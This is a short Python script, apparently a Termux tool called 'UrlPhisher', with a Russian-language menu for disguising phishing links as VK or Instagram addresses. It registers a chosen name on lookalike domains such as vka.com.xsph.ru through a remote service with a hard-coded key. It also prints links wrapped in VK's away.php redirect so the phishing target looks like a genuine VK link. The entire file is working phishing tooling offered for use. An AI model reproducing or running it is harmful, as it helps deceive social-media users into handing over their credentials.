import requests
print("""
 o   o     o o--o  o          o
 |   |     | |   | |    o     |
 o   | o-o | O--o  O--o   o-o O--o
  \  | |   | |     |  | |  \  |  |
   o-o o   o o     o  o | o-o o  o
       ┌───── •✧✧• ─────┐
        -  Termux-Lab  -
       └───── •✧✧• ─────┘
""")
while True:
    print("""
    [0] Выйти
    [1] VK
    [2] Instagram
    """)
    va = input("|?|> ")
    if va == '1':
        purl = input("|Ссылка на фишинг|> ")
        print("|Как должна выглядеть?")
        nfu = input("[]: vka.com.xsph.ru/")
        r = requests.get("http://vka.com.xsph.ru/index.php", params={"new_url":purl, "url_name":nfu, "key":"termuxlab"})
        if r.text == '1':
            print("Ваша новая ссылка:\n\n     >>>> http://vka.com.xsph.ru/"+nfu+" <<<<\n")
            print("     >>>> http://vk.com/away.php?photo435_33&to=http://vka.com.xsph.ru/"+nfu+" <<<<\n")
            print("     >>>> http://vk.com/away.php?photo435_33&to="+purl+" <<<<\n")
            ny = input("Выйти из UrlPhisher? [y/n] ")
            if ny == 'y':
                break
        else:
            print("Строки должны быть заполнены")
    elif va == '2':
        purl = input("|Ссылка на фишинг|> ")
        print("|Как должна выглядеть?")
        nfu = input("[]: instagram.com.xsph.ru/")
        r = requests.get("http://instagram.com.xsph.ru/index.php", params={"new_url":purl, "url_name":nfu, "key":"termuxlab"})
        if r.text == '1':
            print("Ваша новая ссылка:\n\n     >>>> http://instagram.com.xsph.ru/"+nfu+" <<<<\n")
            ny = input("Выйти из UrlPhisher? [y/n] ")
            if ny == 'y':
                break
        else:
            print("Строки должны быть заполнены")
    elif va == '0':
        break
    else:
        print("Выберите вариант...")
